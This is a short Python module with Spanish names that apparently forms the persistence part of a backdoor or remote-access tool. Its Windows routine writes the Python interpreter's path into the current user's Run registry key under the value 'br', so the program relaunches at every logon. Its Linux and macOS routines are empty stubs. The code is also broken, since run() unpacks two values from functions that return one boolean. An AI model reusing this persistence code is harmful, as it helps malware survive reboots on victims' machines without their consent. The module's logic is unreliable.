import sys


def windowsPersistencia():
    import winreg
    from winreg import HKEY_CURRENT_USER as HKCU

    run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
    bin_path = sys.executable

    try:
        reg_key = winreg.OpenKey(HKCU, run_key, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(reg_key, 'br', 0, winreg.REG_SZ, bin_path)
        winreg.CloseKey(reg_key)
        return True
    except Exception:
        return False

def linuxPersistencia():
    return False

def macPersistencia():
    return False

def run(sistema):
    if sistema == 'win':
        ejecutado, detalles = windowsPersistencia()
    elif sistema == 'nix':
        ejecutado, detalles = linuxPersistencia()
    elif sistema == 'mac':
        ejecutado, detalles = macPersistencia()
    else:
        return 'Error: sistema no soportado'

    if ejecutado:
        res = "Se ha ejecutado la persistencia"
    else:
        res = "Error: no se pudo ejecutar la persistencia"
    return res